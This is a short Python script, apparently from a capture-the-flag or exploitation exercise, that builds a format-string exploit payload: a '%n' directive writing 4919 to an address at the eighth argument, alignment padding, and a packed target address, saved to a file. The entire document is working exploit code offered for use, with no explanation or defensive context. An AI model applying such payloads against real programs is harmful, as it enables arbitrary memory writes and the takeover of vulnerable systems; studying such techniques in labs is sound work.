payload = "%4919c%8$n"
payload += "A"*6 #align to 8
payload += "\x74\x10\x60"

with open ("payload", "w") as f:
	f.write(payload)
